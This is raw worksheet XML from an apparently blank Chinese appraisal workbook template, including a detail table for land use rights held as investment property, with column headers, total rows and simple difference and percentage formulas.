    <row r="13" ht="18" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="381" t="n"/>
      <c r="E13" s="381" t="n"/>
      <c r="F13" s="380" t="n"/>
      <c r="G13" s="587" t="n"/>
      <c r="H13" s="284" t="n"/>
      <c r="I13" s="555" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555" t="n"/>
      <c r="L13" s="555" t="n"/>
      <c r="M13" s="555" t="n"/>
      <c r="N13" s="555">
        <f>M13-L13</f>
        <v/>
      </c>
      <c r="O13" s="555">
        <f>IF(L13=0,"",N13/L13*100)</f>
        <v/>
      </c>
      <c r="P13" s="180" t="n"/>
    </row>
    <row r="14" ht="18" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="381" t="n"/>
      <c r="E14" s="381" t="n"/>
      <c r="F14" s="380" t="n"/>
      <c r="G14" s="587" t="n"/>
      <c r="H14" s="284" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555" t="n"/>
      <c r="L14" s="555" t="n"/>
      <c r="M14" s="555" t="n"/>
      <c r="N14" s="555">
        <f>M14-L14</f>
        <v/>
      </c>
      <c r="O14" s="555">
        <f>IF(L14=0,"",N14/L14*100)</f>
        <v/>
      </c>
      <c r="P14" s="180" t="n"/>
    </row>
    <row r="15" ht="18" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="381" t="n"/>
      <c r="E15" s="381" t="n"/>
      <c r="F15" s="380" t="n"/>
      <c r="G15" s="587" t="n"/>
      <c r="H15" s="284" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555" t="n"/>
      <c r="L15" s="555" t="n"/>
      <c r="M15" s="555" t="n"/>
      <c r="N15" s="555">
        <f>M15-L15</f>
        <v/>
      </c>
      <c r="O15" s="555">
        <f>IF(L15=0,"",N15/L15*100)</f>
        <v/>
      </c>
      <c r="P15" s="180" t="n"/>
    </row>
    <row r="16" ht="18" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="381" t="n"/>
      <c r="E16" s="381" t="n"/>
      <c r="F16" s="380" t="n"/>
      <c r="G16" s="587" t="n"/>
      <c r="H16" s="284" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555" t="n"/>
      <c r="L16" s="555" t="n"/>
      <c r="M16" s="555" t="n"/>
      <c r="N16" s="555">
        <f>M16-L16</f>
        <v/>
      </c>
      <c r="O16" s="555">
        <f>IF(L16=0,"",N16/L16*100)</f>
        <v/>
      </c>
      <c r="P16" s="180" t="n"/>
    </row>
    <row r="17" ht="18" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="381" t="n"/>
      <c r="E17" s="381" t="n"/>
      <c r="F17" s="380" t="n"/>
      <c r="G17" s="587" t="n"/>
      <c r="H17" s="284" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555" t="n"/>
      <c r="L17" s="555" t="n"/>
      <c r="M17" s="555" t="n"/>
      <c r="N17" s="555">
        <f>M17-L17</f>
        <v/>
      </c>
      <c r="O17" s="555">
        <f>IF(L17=0,"",N17/L17*100)</f>
        <v/>
      </c>
      <c r="P17" s="180" t="n"/>
    </row>
    <row r="18" ht="18" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="381" t="n"/>
      <c r="E18" s="381" t="n"/>
      <c r="F18" s="380" t="n"/>
      <c r="G18" s="587" t="n"/>
      <c r="H18" s="284" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555" t="n"/>
      <c r="L18" s="555" t="n"/>
      <c r="M18" s="555" t="n"/>
      <c r="N18" s="555">
        <f>M18-L18</f>
        <v/>
      </c>
      <c r="O18" s="555">
        <f>IF(L18=0,"",N18/L18*100)</f>
        <v/>
      </c>
      <c r="P18" s="180" t="n"/>
    </row>
    <row r="19" ht="18" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="381" t="n"/>
      <c r="E19" s="381" t="n"/>
      <c r="F19" s="380" t="n"/>
      <c r="G19" s="587" t="n"/>
      <c r="H19" s="284" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555" t="n"/>
      <c r="L19" s="555" t="n"/>
      <c r="M19" s="555" t="n"/>
      <c r="N19" s="555">
        <f>M19-L19</f>
        <v/>
      </c>
      <c r="O19" s="555">
        <f>IF(L19=0,"",N19/L19*100)</f>
        <v/>
      </c>
      <c r="P19" s="180" t="n"/>
    </row>
    <row r="20" ht="18" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="381" t="n"/>
      <c r="E20" s="381" t="n"/>
      <c r="F20" s="380" t="n"/>
      <c r="G20" s="587" t="n"/>
      <c r="H20" s="284" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555" t="n"/>
      <c r="L20" s="555" t="n"/>
      <c r="M20" s="555" t="n"/>
      <c r="N20" s="555">
        <f>M20-L20</f>
        <v/>
      </c>
      <c r="O20" s="555">
        <f>IF(L20=0,"",N20/L20*100)</f>
        <v/>
      </c>
      <c r="P20" s="180" t="n"/>
    </row>
    <row r="21" ht="18" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="381" t="n"/>
      <c r="E21" s="381" t="n"/>
      <c r="F21" s="380" t="n"/>
      <c r="G21" s="587" t="n"/>
      <c r="H21" s="284" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555" t="n"/>
      <c r="L21" s="555" t="n"/>
      <c r="M21" s="555" t="n"/>
      <c r="N21" s="555">
        <f>M21-L21</f>
        <v/>
      </c>
      <c r="O21" s="555">
        <f>IF(L21=0,"",N21/L21*100)</f>
        <v/>
      </c>
      <c r="P21" s="180" t="n"/>
    </row>
    <row r="22" ht="18" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="381" t="n"/>
      <c r="E22" s="381" t="n"/>
      <c r="F22" s="380" t="n"/>
      <c r="G22" s="587" t="n"/>
      <c r="H22" s="284" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555" t="n"/>
      <c r="L22" s="555" t="n"/>
      <c r="M22" s="555" t="n"/>
      <c r="N22" s="555">
        <f>M22-L22</f>
        <v/>
      </c>
      <c r="O22" s="555">
        <f>IF(L22=0,"",N22/L22*100)</f>
        <v/>
      </c>
      <c r="P22" s="180" t="n"/>
    </row>
    <row r="23" ht="18" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="381" t="n"/>
      <c r="E23" s="381" t="n"/>
      <c r="F23" s="380" t="n"/>
      <c r="G23" s="587" t="n"/>
      <c r="H23" s="284" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555" t="n"/>
      <c r="L23" s="555" t="n"/>
      <c r="M23" s="555" t="n"/>
      <c r="N23" s="555">
        <f>M23-L23</f>
        <v/>
      </c>
      <c r="O23" s="555">
        <f>IF(L23=0,"",N23/L23*100)</f>
        <v/>
      </c>
      <c r="P23" s="180" t="n"/>
    </row>
    <row r="24" ht="18" customHeight="1" s="415">
      <c r="A24" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B24" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C24" s="593" t="n"/>
      <c r="D24" s="567" t="n"/>
      <c r="E24" s="381" t="n"/>
      <c r="F24" s="380" t="n"/>
      <c r="G24" s="587" t="n"/>
      <c r="H24" s="284" t="n"/>
      <c r="I24" s="555">
        <f>SUM(I6:I23)</f>
        <v/>
      </c>
      <c r="J24" s="555" t="inlineStr"/>
      <c r="K24" s="555">
        <f>SUM(K6:K23)</f>
        <v/>
      </c>
      <c r="L24" s="555">
        <f>SUM(L6:L23)</f>
        <v/>
      </c>
      <c r="M24" s="555">
        <f>SUM(M6:M23)</f>
        <v/>
      </c>
      <c r="N24" s="555">
        <f>M24-L24</f>
        <v/>
      </c>
      <c r="O24" s="555">
        <f>IF(L24=0,"",N24/L24*100)</f>
        <v/>
      </c>
      <c r="P24" s="180" t="n"/>
    </row>
    <row r="25" ht="18" customHeight="1" s="415">
      <c r="A25" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B25" s="380" t="inlineStr">
        <is>
          <t>减：投资性房地产减值准备</t>
        </is>
      </c>
      <c r="C25" s="593" t="n"/>
      <c r="D25" s="567" t="n"/>
      <c r="E25" s="381" t="n"/>
      <c r="F25" s="380" t="n"/>
      <c r="G25" s="587" t="n"/>
      <c r="H25" s="284" t="n"/>
      <c r="I25" s="555" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555" t="n"/>
      <c r="L25" s="555" t="n"/>
      <c r="M25" s="555" t="n"/>
      <c r="N25" s="555">
        <f>M25-L25</f>
        <v/>
      </c>
      <c r="O25" s="555">
        <f>IF(L25=0,"",N25/L25*100)</f>
        <v/>
      </c>
      <c r="P25" s="180" t="n"/>
    </row>
    <row r="26" ht="18" customHeight="1" s="415">
      <c r="A26" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B26" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C26" s="593" t="n"/>
      <c r="D26" s="567" t="n"/>
      <c r="E26" s="266" t="n"/>
      <c r="F26" s="380" t="n"/>
      <c r="G26" s="115" t="n"/>
      <c r="H26" s="115" t="n"/>
      <c r="I26" s="555">
        <f>I24-I25</f>
        <v/>
      </c>
      <c r="J26" s="555" t="inlineStr"/>
      <c r="K26" s="555">
        <f>K24-K25</f>
        <v/>
      </c>
      <c r="L26" s="555">
        <f>L24-L25</f>
        <v/>
      </c>
      <c r="M26" s="555">
        <f>M24-M25</f>
        <v/>
      </c>
      <c r="N26" s="555">
        <f>M26-L26</f>
        <v/>
      </c>
      <c r="O26" s="555">
        <f>IF(L26=0,"",N26/L26*100)</f>
        <v/>
      </c>
      <c r="P26" s="180" t="n"/>
    </row>
    <row r="27" ht="16.8" customHeight="1" s="415">
      <c r="A27" s="116" t="n"/>
    </row>
    <row r="28" ht="16.8" customHeight="1" s="415">
      <c r="A28" s="116" t="n"/>
    </row>
    <row r="29" ht="16.8" customHeight="1" s="415">
      <c r="A29" s="116" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="22">
    <mergeCell ref="B2:P2"/>
    <mergeCell ref="H6:H7"/>
    <mergeCell ref="J6:J7"/>
    <mergeCell ref="B1:P1"/>
    <mergeCell ref="P6:P7"/>
    <mergeCell ref="B5:H5"/>
    <mergeCell ref="G6:G7"/>
    <mergeCell ref="M6:M7"/>
    <mergeCell ref="E6:E7"/>
    <mergeCell ref="B6:B7"/>
    <mergeCell ref="B24:D24"/>
    <mergeCell ref="B26:D26"/>
    <mergeCell ref="L6:L7"/>
    <mergeCell ref="N6:N7"/>
    <mergeCell ref="B25:D25"/>
    <mergeCell ref="B3:P3"/>
    <mergeCell ref="I6:I7"/>
    <mergeCell ref="K6:K7"/>
    <mergeCell ref="C6:C7"/>
    <mergeCell ref="O6:O7"/>
    <mergeCell ref="D6:D7"/>
    <mergeCell ref="F6:F7"/>
  </mergeCells>
  <conditionalFormatting sqref="B6:P26">
    <cfRule type="expression" priority="1" dxfId="3">
      <formula>_xlfn.ISFORMULA(B6)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0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 codeName="Sheet53">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:R29"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A7" sqref="A7:A26"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.2"/>
  <cols>
    <col width="13.6666666666667" customWidth="1" style="410" min="1" max="1"/>
    <col width="11.6666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="12.5" customWidth="1" style="410" min="3" max="3"/>
    <col width="9" customWidth="1" style="410" min="4" max="4"/>
    <col width="10.8333333333333" customWidth="1" style="410" min="5" max="5"/>
    <col width="8.16666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col width="8.66666666666667" customWidth="1" style="410" min="7" max="10"/>
    <col width="9.33333333333333" customWidth="1" style="410" min="11" max="11"/>
    <col width="7.5" customWidth="1" style="410" min="12" max="12"/>
    <col width="12.6666666666667" customWidth="1" style="410" min="13" max="14"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="410" min="15" max="16"/>
    <col outlineLevel="1" width="7.33333333333333" customWidth="1" style="410" min="17" max="17"/>
    <col width="8.16666666666667" customWidth="1" style="410" min="18" max="18"/>
    <col width="9" customWidth="1" style="410" min="19" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="A1" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>投资性房地产——土地使用权评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="17.25" customFormat="1" customHeight="1" s="368">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="261" t="inlineStr">
        <is>
          <t>（采用成本模式计量）</t>
        </is>
      </c>
    </row>
    <row r="3" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A3" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B3" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="4" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A4" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B4" s="376" t="n"/>
      <c r="C4" s="547" t="n"/>
      <c r="D4" s="547" t="n"/>
      <c r="E4" s="547" t="n"/>
      <c r="F4" s="547" t="n"/>
      <c r="G4" s="547" t="n"/>
      <c r="H4" s="547" t="n"/>
      <c r="I4" s="547" t="n"/>
      <c r="J4" s="547" t="n"/>
      <c r="K4" s="547" t="n"/>
      <c r="L4" s="373" t="n"/>
      <c r="M4" s="373" t="n"/>
      <c r="N4" s="373" t="n"/>
      <c r="O4" s="373" t="n"/>
      <c r="P4" s="373" t="n"/>
      <c r="Q4" s="291" t="inlineStr">
        <is>
          <t>表4-7</t>
        </is>
      </c>
    </row>
    <row r="5" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A5" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B5" s="601">
        <f>'2-分类汇总'!B4</f>
        <v/>
      </c>
      <c r="C5" s="554" t="n"/>
      <c r="D5" s="554" t="n"/>
      <c r="E5" s="554" t="n"/>
      <c r="F5" s="554" t="n"/>
      <c r="G5" s="347" t="n"/>
      <c r="H5" s="347" t="n"/>
      <c r="I5" s="347" t="n"/>
      <c r="J5" s="347" t="n"/>
      <c r="K5" s="347" t="n"/>
      <c r="L5" s="347" t="n"/>
      <c r="M5" s="347" t="n"/>
      <c r="N5" s="347" t="n"/>
      <c r="O5" s="347" t="n"/>
      <c r="P5" s="347" t="n"/>
      <c r="Q5" s="341" t="n"/>
      <c r="R5" s="291">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="6" ht="43" customFormat="1" customHeight="1" s="267">
      <c r="A6" s="116" t="inlineStr">
        <is>
          <t>检索表头</t>
        </is>
      </c>
      <c r="B6" s="380" t="inlineStr">
        <is>
          <t>序号</t>
        </is>
      </c>
      <c r="C6" s="271" t="inlineStr">
        <is>
          <t>土地权证编号</t>
        </is>
      </c>
      <c r="D6" s="271" t="inlineStr">
        <is>
          <t>宗地名称</t>
        </is>
      </c>
      <c r="E6" s="272" t="inlineStr">
        <is>
          <t>来源</t>
        </is>
      </c>
      <c r="F6" s="271" t="inlineStr">
        <is>
          <t>土地位置</t>
        </is>
      </c>
      <c r="G6" s="271" t="inlineStr">
        <is>
          <t>取得日期</t>
        </is>
      </c>
      <c r="H6" s="271" t="inlineStr">
        <is>
          <t>用地性质</t>
        </is>
      </c>
      <c r="I6" s="271" t="inlineStr">
        <is>
          <t>土地用途</t>
        </is>
      </c>
      <c r="J6" s="271" t="inlineStr">
        <is>
          <t>准用年限</t>
        </is>
      </c>
      <c r="K6" s="271" t="inlineStr">
        <is>
          <t>开发程度</t>
        </is>
      </c>
      <c r="L6" s="271" t="inlineStr">
        <is>
          <t>面积(m2)</t>
        </is>
      </c>
      <c r="M6" s="271" t="inlineStr">
        <is>
          <t>原始入账价值</t>
        </is>
      </c>
      <c r="N6" s="222" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="O6" s="271" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="P6" s="271" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="Q6" s="272" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="R6" s="264" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="380" t="n"/>
      <c r="D7" s="381" t="n"/>
      <c r="E7" s="381" t="n"/>
      <c r="F7" s="381" t="n"/>
      <c r="G7" s="578" t="n"/>
      <c r="H7" s="380" t="n"/>
      <c r="I7" s="380" t="n"/>
      <c r="J7" s="380" t="n"/>
      <c r="K7" s="380" t="n"/>
      <c r="L7" s="555" t="n"/>
      <c r="M7" s="555" t="n"/>
      <c r="N7" s="555" t="n"/>
      <c r="O7" s="555" t="n"/>
      <c r="P7" s="555">
        <f>O7-N7</f>
        <v/>
      </c>
      <c r="Q7" s="555">
        <f>IF(N7=0,"",P7/N7*100)</f>
        <v/>
      </c>
      <c r="R7" s="273" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="380" t="n"/>
      <c r="D8" s="381" t="n"/>
      <c r="E8" s="381" t="n"/>
      <c r="F8" s="381" t="n"/>
      <c r="G8" s="578" t="n"/>
      <c r="H8" s="380" t="n"/>
      <c r="I8" s="380" t="n"/>
      <c r="J8" s="380" t="n"/>
      <c r="K8" s="380" t="n"/>
      <c r="L8" s="555" t="n"/>
      <c r="M8" s="555" t="n"/>
      <c r="N8" s="555" t="n"/>
      <c r="O8" s="555" t="n"/>
      <c r="P8" s="555">
        <f>O8-N8</f>
        <v/>
      </c>
      <c r="Q8" s="555">
        <f>IF(N8=0,"",P8/N8*100)</f>
        <v/>
      </c>
      <c r="R8" s="273" t="n"/>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="380" t="n"/>
      <c r="D9" s="381" t="n"/>
      <c r="E9" s="381" t="n"/>
      <c r="F9" s="381" t="n"/>
      <c r="G9" s="578" t="n"/>
      <c r="H9" s="380" t="n"/>
      <c r="I9" s="380" t="n"/>
      <c r="J9" s="380" t="n"/>
      <c r="K9" s="380" t="n"/>
      <c r="L9" s="555" t="n"/>
      <c r="M9" s="555" t="n"/>
      <c r="N9" s="555" t="n"/>
      <c r="O9" s="555" t="n"/>
      <c r="P9" s="555">
        <f>O9-N9</f>
        <v/>
      </c>
      <c r="Q9" s="555">
        <f>IF(N9=0,"",P9/N9*100)</f>
        <v/>
      </c>
      <c r="R9" s="273" t="n"/>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="380" t="n"/>
      <c r="D10" s="381" t="n"/>
      <c r="E10" s="381" t="n"/>
      <c r="F10" s="381" t="n"/>
      <c r="G10" s="578" t="n"/>
      <c r="H10" s="380" t="n"/>
      <c r="I10" s="380" t="n"/>
      <c r="J10" s="380" t="n"/>
      <c r="K10" s="380" t="n"/>
      <c r="L10" s="555" t="n"/>
      <c r="M10" s="555" t="n"/>
      <c r="N10" s="555" t="n"/>
      <c r="O10" s="555" t="n"/>
      <c r="P10" s="555">
        <f>O10-N10</f>
        <v/>
      </c>
      <c r="Q10" s="555">
        <f>IF(N10=0,"",P10/N10*100)</f>
        <v/>
      </c>
      <c r="R10" s="273" t="n"/>
    </row>
    <row r="11" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="380" t="n"/>
      <c r="D11" s="381" t="n"/>
      <c r="E11" s="381" t="n"/>
      <c r="F11" s="381" t="n"/>
      <c r="G11" s="578" t="n"/>
      <c r="H11" s="380" t="n"/>
      <c r="I11" s="380" t="n"/>
      <c r="J11" s="380" t="n"/>
      <c r="K11" s="380" t="n"/>
      <c r="L11" s="555" t="n"/>
      <c r="M11" s="555" t="n"/>
      <c r="N11" s="555" t="n"/>
      <c r="O11" s="555" t="n"/>
      <c r="P11" s="555">
        <f>O11-N11</f>
        <v/>
      </c>
      <c r="Q11" s="555">
        <f>IF(N11=0,"",P11/N11*100)</f>
        <v/>
      </c>
      <c r="R11" s="273" t="n"/>
    </row>
    <row r="12" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="380" t="n"/>
      <c r="D12" s="381" t="n"/>
      <c r="E12" s="381" t="n"/>
      <c r="F12" s="381" t="n"/>
      <c r="G12" s="578" t="n"/>
      <c r="H12" s="380" t="n"/>
      <c r="I12" s="380" t="n"/>
      <c r="J12" s="380" t="n"/>
      <c r="K12" s="380" t="n"/>
      <c r="L12" s="555" t="n"/>
      <c r="M12" s="555" t="n"/>
      <c r="N12" s="555" t="n"/>
      <c r="O12" s="555" t="n"/>
      <c r="P12" s="555">
        <f>O12-N12</f>
        <v/>
      </c>
      <c r="Q12" s="555">
        <f>IF(N12=0,"",P12/N12*100)</f>
        <v/>
      </c>
      <c r="R12" s="273" t="n"/>
    </row>
    <row r="13" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="380" t="n"/>
      <c r="D13" s="381" t="n"/>
      <c r="E13" s="381" t="n"/>
      <c r="F13" s="381" t="n"/>
      <c r="G13" s="578" t="n"/>
      <c r="H13" s="380" t="n"/>
      <c r="I13" s="380" t="n"/>
      <c r="J13" s="380" t="n"/>
      <c r="K13" s="380" t="n"/>
      <c r="L13" s="555" t="n"/>
      <c r="M13" s="555" t="n"/>
      <c r="N13" s="555" t="n"/>
      <c r="O13" s="555" t="n"/>
      <c r="P13" s="555">
        <f>O13-N13</f>
        <v/>
      </c>
      <c r="Q13" s="555">
        <f>IF(N13=0,"",P13/N13*100)</f>
        <v/>
      </c>
      <c r="R13" s="273" t="n"/>
    </row>
    <row r="14" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="380" t="n"/>
      <c r="D14" s="381" t="n"/>
      <c r="E14" s="381" t="n"/>
      <c r="F14" s="381" t="n"/>
      <c r="G14" s="578" t="n"/>
      <c r="H14" s="380" t="n"/>
      <c r="I14" s="380" t="n"/>
      <c r="J14" s="380" t="n"/>
      <c r="K14" s="380" t="n"/>
      <c r="L14" s="555" t="n"/>
      <c r="M14" s="555" t="n"/>
      <c r="N14" s="555" t="n"/>
      <c r="O14" s="555" t="n"/>
      <c r="P14" s="555">
        <f>O14-N14</f>
        <v/>
      </c>
      <c r="Q14" s="555">
        <f>IF(N14=0,"",P14/N14*100)</f>
        <v/>
      </c>
      <c r="R14" s="273" t="n"/>
    </row>
    <row r="15" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="380" t="n"/>
      <c r="D15" s="381" t="n"/>
      <c r="E15" s="381" t="n"/>
      <c r="F15" s="381" t="n"/>
      <c r="G15" s="578" t="n"/>
      <c r="H15" s="380" t="n"/>
      <c r="I15" s="380" t="n"/>
      <c r="J15" s="380" t="n"/>
      <c r="K15" s="380" t="n"/>
      <c r="L15" s="555" t="n"/>
      <c r="M15" s="555" t="n"/>
      <c r="N15" s="555" t="n"/>
      <c r="O15" s="555" t="n"/>
      <c r="P15" s="555">
        <f>O15-N15</f>
        <v/>
      </c>
      <c r="Q15" s="555">
        <f>IF(N15=0,"",P15/N15*100)</f>
        <v/>
      </c>
      <c r="R15" s="273" t="n"/>
    </row>
    <row r="16" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="380" t="n"/>
      <c r="D16" s="381" t="n"/>
      <c r="E16" s="381" t="n"/>
      <c r="F16" s="381" t="n"/>
      <c r="G16" s="578" t="n"/>
      <c r="H16" s="380" t="n"/>
      <c r="I16" s="380" t="n"/>
      <c r="J16" s="380" t="n"/>
      <c r="K16" s="380" t="n"/>
      <c r="L16" s="555" t="n"/>
      <c r="M16" s="555" t="n"/>
      <c r="N16" s="555" t="n"/>
      <c r="O16" s="555" t="n"/>
      <c r="P16" s="555">
        <f>O16-N16</f>
        <v/>
      </c>
      <c r="Q16" s="555">
        <f>IF(N16=0,"",P16/N16*100)</f>
        <v/>
      </c>
      <c r="R16" s="273" t="n"/>
    </row>
    <row r="17" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="380" t="n"/>
      <c r="D17" s="381" t="n"/>
      <c r="E17" s="381" t="n"/>
      <c r="F17" s="381" t="n"/>
      <c r="G17" s="578" t="n"/>
      <c r="H17" s="380" t="n"/>
      <c r="I17" s="380" t="n"/>
      <c r="J17" s="380" t="n"/>
      <c r="K17" s="380" t="n"/>
      <c r="L17" s="555" t="n"/>
      <c r="M17" s="555" t="n"/>
      <c r="N17" s="555" t="n"/>
      <c r="O17" s="555" t="n"/>
      <c r="P17" s="555">
        <f>O17-N17</f>
        <v/>
      </c>
      <c r="Q17" s="555">
        <f>IF(N17=0,"",P17/N17*100)</f>
        <v/>
      </c>
      <c r="R17" s="273" t="n"/>
    </row>
    <row r="18" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="380" t="n"/>
      <c r="D18" s="381" t="n"/>
      <c r="E18" s="381" t="n"/>
      <c r="F18" s="381" t="n"/>
      <c r="G18" s="578" t="n"/>
      <c r="H18" s="380" t="n"/>
      <c r="I18" s="380" t="n"/>
      <c r="J18" s="380" t="n"/>
      <c r="K18" s="380" t="n"/>
      <c r="L18" s="555" t="n"/>
      <c r="M18" s="555" t="n"/>
      <c r="N18" s="555" t="n"/>
      <c r="O18" s="555" t="n"/>
      <c r="P18" s="555">
        <f>O18-N18</f>
        <v/>
      </c>
      <c r="Q18" s="555">
        <f>IF(N18=0,"",P18/N18*100)</f>
        <v/>
      </c>
      <c r="R18" s="273" t="n"/>
    </row>
    <row r="19" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="380" t="n"/>
      <c r="D19" s="381" t="n"/>
      <c r="E19" s="381" t="n"/>
      <c r="F19" s="381" t="n"/>
      <c r="G19" s="578" t="n"/>
      <c r="H19" s="380" t="n"/>
      <c r="I19" s="380" t="n"/>
      <c r="J19" s="380" t="n"/>
      <c r="K19" s="380" t="n"/>
      <c r="L19" s="555" t="n"/>
      <c r="M19" s="555" t="n"/>
      <c r="N19" s="555" t="n"/>
      <c r="O19" s="555" t="n"/>
      <c r="P19" s="555">
        <f>O19-N19</f>
        <v/>
      </c>
      <c r="Q19" s="555">
        <f>IF(N19=0,"",P19/N19*100)</f>
        <v/>
      </c>
      <c r="R19" s="273" t="n"/>
    </row>
    <row r="20" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="380" t="n"/>
      <c r="D20" s="381" t="n"/>
